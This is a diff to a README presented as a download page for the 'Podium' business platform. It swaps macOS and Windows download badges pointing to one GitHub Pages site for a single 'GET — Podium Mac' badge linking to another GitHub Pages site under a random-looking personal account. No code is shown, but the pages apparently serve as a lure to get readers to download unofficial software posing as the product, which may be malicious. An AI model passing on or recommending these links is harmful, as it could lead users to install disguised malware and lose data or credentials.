@@ -1,18 +1,6 @@
 # Podium Download — Business Platform
 
-<a href="https://io-app-git.github.io/.github/?offer=Podium" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Podium%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="Podium for macOS">
-</a>
-
-<a href="https://io-app-git.github.io/.github/?offer=Podium" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Podium%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="Podium for Windows">
-</a>
+[![GET Podium Mac](https://img.shields.io/badge/GET%20%E2%80%94%20Podium-Mac-0078D6?style=for-the-badge&logoColor=white)](https://dorothyrobertsz818.github.io/.github/Podium-Mac)
 
 ---
 
